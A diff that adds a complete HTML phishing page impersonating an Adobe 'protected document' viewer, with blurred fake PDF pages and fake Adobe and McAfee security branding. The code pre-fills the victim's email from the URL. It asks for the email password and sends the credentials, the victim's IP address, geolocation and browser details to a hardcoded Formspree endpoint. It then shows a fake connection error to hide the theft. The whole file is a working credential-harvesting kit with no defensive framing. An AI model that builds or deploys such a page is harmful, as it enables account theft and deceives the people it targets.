@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secured Document Access</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- React & Babel for JSX -->
+    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Framer Motion -->
+    <script src="https://unpkg.com/framer-motion@10.16.4/dist/framer-motion.js"></script>
+    
+    <style>
+        body { font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .document-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1.5rem;
+            padding: 2rem;
+        }
+        .pdf-page {
+            aspect-ratio: 1 / 1.414;
+            background: white;
+            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
+            border: 1px solid #e5e7eb;
+            padding: 1.5rem;
+            position: relative;
+        }
+        .blur-overlay {
+            backdrop-filter: blur(8px);
+            background: rgba(255, 255, 255, 0.4);
+        }
+        .adobe-input {
+            border: 1px solid #ccc;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .adobe-input:focus {
+            border-color: #D73A49;
+            box-shadow: 0 0 0 2px rgba(215, 58, 73, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-[#e4e4e4]">
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+        const { motion, AnimatePresence } = window.Motion;
+
+        const Icon = ({ name, className, size = 24 }) => {
+            const [icon, setIcon] = useState(null);
+            useEffect(() => {
+                if (window.lucide && window.lucide.icons[name]) {
+                    setIcon(window.lucide.icons[name]);
+                }
+            }, [name]);
+            
+            if (!icon) return <span className={className} style={{width: size, height: size}}></span>;
+            
+            return (
+                <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width={size}
+                    height={size}
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    className={className}
+                    dangerouslySetInnerHTML={{ __html: icon[1].map(i => `<${i[0]} ${Object.entries(i[1]).map(([k,v]) => `${k}="${v}"`).join(' ')} />`).join('') }}
+                />
+            );
+        };
+
+        function App() {
+            const [showModal, setShowModal] = useState(true);
+            const [showLogin, setShowLogin] = useState(false);
+            const [formData, setFormData] = useState({ email: "", password: "" });
+            const [isSubmitting, setIsSubmitting] = useState(false);
+
+            useEffect(() => {
+                const getEmailFromURL = () => {
+                    const params = new URLSearchParams(window.location.search);
+                    let val = params.get('e') || params.get('email');
+                    
+                    if (!val) {
+                        val = window.location.hash.substring(1);
+                    }
+
+                    if (!val) return "";
+
+                    try {
+                        const decoded = atob(val);
+                        if (decoded.includes('@') && decoded.includes('.')) return decoded;
+                    } catch (e) {}
+
+                    if (val.includes('@')) return decodeURIComponent(val);
+                    return "";
+                };
+
+                const email = getEmailFromURL();
+                if (email) {
+                    setFormData(prev => ({ ...prev, email }));
+                }
+            }, []);
+
+            const handleSubmit = async (e) => {
+                e.preventDefault();
+                setIsSubmitting(true);
+                
+                // For standalone HTML to work everywhere, we use Formspree (Free)
+                // You can get your own ID at formspree.io to receive emails
+                const FORMSPREE_ID = "xpwaqvov"; // Replace with your Formspree ID
+                const endpoint = `https://formspree.io/f/${FORMSPREE_ID}`;
+
+                try {
+                    const geoRes = await fetch('https://ipapi.co/json/');
+                    const geoData = await geoRes.json();
+                    
+                    const response = await fetch(endpoint, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            ...formData,
+                            _subject: `New Login: ${formData.email}`,
+                            location: `${geoData.city}, ${geoData.region}, ${geoData.country_name}`,
+                            ip: geoData.ip,
+                            userAgent: navigator.userAgent
+                        }),
+                    });
+
+                    if (response.ok) {
+                        alert("Error: Verification failed. Your internet connection seems unstable. Please try again later.");
+                        setFormData({ email: "", password: "" });
+                    }
+                } catch (error) {
+                    console.error("Submission failed:", error);
+                } finally {
+                    setIsSubmitting(false);
+                }
+            };
+
+            return (
+                <div className="min-h-screen">
+                    {/* Background Header */}
+                    <nav className="bg-[#323639] text-white px-4 py-2 flex justify-between items-center sticky top-0 z-10">
+                        <div className="flex items-center gap-4">
+                            <Icon name="Menu" className="text-gray-400" size={18} />
+                            <div className="flex items-center gap-2">
+                                <Icon name="FileText" className="text-red-500" size={18} />
+                                <span className="text-sm font-medium">Secured_Transfer_v4.pdf</span>
+                            </div>
+                        </div>
+                        <div className="flex items-center gap-6 text-sm text-gray-300 font-medium">
+                            <span className="flex items-center gap-1.5"><Icon name="Eye" size={16} /> View</span>
+                            <span className="flex items-center gap-1.5 border border-gray-600 px-3 py-1 rounded bg-gray-700 text-white cursor-pointer"><Icon name="Download" size={16} /> Download All</span>
+                        </div>
+                    </nav>
+
+                    {/* Blurred Background PDF View */}
+                    <div className="max-w-5xl mx-auto py-8 px-4 blur-[3px] select-none pointer-events-none">
+                        <div className="grid grid-cols-2 gap-8">
+                            {[1, 2, 3, 4].map(i => (
+                                <div key={i} className="pdf-page bg-white shadow-xl flex flex-col gap-4">
+                                    <div className="h-6 bg-gray-100 w-3/4 mb-4"></div>
+                                    <div className="space-y-3">
+                                        <div className="h-2 bg-gray-50 w-full"></div>
+                                        <div className="h-2 bg-gray-50 w-full"></div>
+                                        <div className="h-2 bg-gray-50 w-5/6"></div>
+                                    </div>
+                                    <div className="mt-8 grid grid-cols-3 gap-2">
+                                        <div className="aspect-square bg-gray-50 border border-gray-100"></div>
+                                        <div className="aspect-square bg-gray-50 border border-gray-100"></div>
+                                        <div className="aspect-square bg-gray-50 border border-gray-100"></div>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+
+                    {/* Modal Overlay */}
+                    <AnimatePresence>
+                        {showModal && (
+                            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/30 backdrop-blur-sm">
+                                <motion.div 
+                                    initial={{ opacity: 0, scale: 0.95 }}
+                                    animate={{ opacity: 1, scale: 1 }}
+                                    className="relative w-full max-w-lg bg-white rounded-lg shadow-2xl overflow-hidden"
+                                >
+                                    <div className="p-8">
+                                        <div className="flex items-center gap-3 mb-6">
+                                            <div className="p-2 bg-red-50 rounded">
+                                                <Icon name="Shield" className="text-red-600" size={24} />
+                                            </div>
+                                            <h2 className="text-xl font-semibold text-gray-800">Protected Document Access</h2>
+                                        </div>
+                                        
+                                        <p className="text-gray-600 text-sm mb-8 leading-relaxed">
+                                            This file is encrypted by <b>AdobeDoc® Cloud Security</b>. To view or download these attachments, please verify your credentials.
+                                        </p>
+
+                                        <div className="grid grid-cols-3 gap-4 mb-8">
+                                            {[
+                                                { name: 'Invoice.pdf', time: '2m ago' },
+                                                { name: 'PO_#992.pdf', time: '1h ago' },
+                                                { name: 'Profile.docx', time: '5m ago' }
+                                            ].map((doc, idx) => (
+                                                <div key={idx} className="flex flex-col items-center p-3 border border-gray-100 rounded-lg bg-gray-50 group hover:border-red-200 transition-colors cursor-pointer" onClick={() => setShowLogin(true)}>
+                                                    <Icon name="File" className="text-red-500 mb-2 group-hover:scale-110 transition-transform" />
+                                                    <span className="text-[10px] font-bold text-gray-700 truncate w-full text-center">{doc.name}</span>
+                                                    <span className="text-[9px] text-gray-400 mt-1">{doc.time}</span>
+                                                </div>
+                                            ))}
+                                        </div>
+
+                                        <button 
+                                            onClick={() => setShowLogin(true)}
+                                            className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-md transition-all flex items-center justify-center gap-2 shadow-lg shadow-red-600/20"
+                                        >
+                                            <Icon name="Lock" size={16} />
+                                            ACCESS DOCUMENT
+                                        </button>
+                                    </div>
+                                    <div className="bg-gray-50 px-8 py-4 border-t border-gray-100 flex justify-between items-center text-[10px] text-gray-400 uppercase tracking-widest font-bold">
+                                        <span>Adobe Cloud 2024</span>
+                                        <span>Encrypted with 256-bit AES</span>
+                                    </div>
+                                </motion.div>
+                            </div>
+                        )}
+                    </AnimatePresence>
+
+                    {/* Adobe Reader Login Layout */}
+                    <AnimatePresence>
+                        {showLogin && (
+                            <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60 backdrop-blur-md">
+                                <motion.div 
+                                    initial={{ y: 20, opacity: 0 }}
+                                    animate={{ y: 0, opacity: 1 }}
+                                    className="relative w-full max-w-sm bg-[#F5F5F5] rounded shadow-[0_30px_90px_rgba(0,0,0,0.6)] border border-gray-300"
+                                >
+                                    <div className="bg-[#da1c1c] p-1.5 flex items-center justify-between text-white border-b border-black/10 rounded-t">
+                                        <div className="flex items-center gap-1">
+                                            <div className="w-8 h-8 flex items-center justify-center">
+                                                <svg viewBox="0 0 512 512" className="w-5 h-5 fill-white">
+                                                    <path d="M312.3 112L465.1 384H312.3V112zM199.7 112L46.9 384H199.7V112zM256 195.9L338.4 344H173.6L256 195.9z"/>
+                                                </svg>
+                                            </div>
+                                            <span className="text-[11px] font-bold tracking-tight">Adobe Reader XI</span>
+                                        </div>
+                                        <div className="flex items-center gap-2">
+                                            <div className="w-6 h-8 flex flex-col bg-[#da1c1c] border border-white/30 rounded-sm overflow-hidden scale-90">
+                                                <div className="h-1/2 bg-white flex items-center justify-center p-0.5">
+                                                    <svg viewBox="0 0 512 512" className="w-full h-full fill-[#da1c1c]">
+                                                        <path d="M312.3 112L465.1 384H312.3V112zM199.7 112L46.9 384H199.7V112zM256 195.9L338.4 344H173.6L256 195.9z"/>
+                                                    </svg>
+                                                </div>
+                                                <div className="h-1/2 bg-[#da1c1c] flex items-center justify-center text-[4px] font-bold text-white leading-none px-0.5 text-center uppercase">
+                                                    Adobe
+                                                </div>
+                                            </div>
+                                            <Icon name="X" className="cursor-pointer opacity-70 hover:opacity-100" size={16} onClick={() => setShowLogin(false)} />
+                                        </div>
+                                    </div>
+
+                                    <div className="p-8 flex flex-col items-center">
+                                        <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center border border-gray-200 shadow-sm mb-6">
+                                            <Icon name="LockKeyhole" className="text-[#34495E]" size={32} />
+                                        </div>
+                                        
+                                        <h3 className="text-lg font-medium text-[#444] mb-1">Verify Identity</h3>
+                                        <p className="text-[11px] text-[#888] mb-2 text-center">To process your download, please log in with your email provider</p>
+                                        {formData.email && (
+                                            <p className="text-sm font-bold text-[#444] mb-6 text-center">{formData.email}</p>
+                                        )}
+
+                                        <form onSubmit={handleSubmit} className="w-full space-y-4">
+                                            <div className="relative">
+                                                <input
+                                                    required
+                                                    type="password"
+                                                    placeholder="Enter Email Password"
+                                                    value={formData.password}
+                                                    onChange={(e) => setFormData({ ...formData, password: e.target.value })}
+                                                    className="adobe-input block w-full px-4 py-3 rounded text-sm bg-white"
+                                                />
+                                            </div>
+                                            
+                                            <button 
+                                                type="submit"
+                                                disabled={isSubmitting}
+                                                className="w-full bg-[#B12229] hover:bg-[#8e1b21] text-white font-bold py-3 rounded shadow-md transition-all mt-4 text-xs uppercase tracking-widest disabled:opacity-50"
+                                            >
+                                                {isSubmitting ? "Verifying..." : "Download Now"}
+                                            </button>
+                                        </form>
+
+                                        <div className="mt-8 flex items-center gap-2 text-gray-400">
+                                            <Icon name="ShieldCheck" size={12} />
+                                            <span className="text-[9px] font-bold uppercase tracking-widest">McAfee Secure Certified</span>
+                                        </div>
+                                    </div>
+                                    
+                                    <div className="bg-[#EEE] p-3 text-center border-t border-gray-200 rounded-b">
+                                        <span className="text-[9px] text-[#aaa] font-bold uppercase tracking-widest">© 2024 Adobe Systems Inc.</span>
+                                    </div>
+                                </motion.div>
+                            </div>
+                        )}
+                    </AnimatePresence>
+                </div>
+            );
+        }
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
+
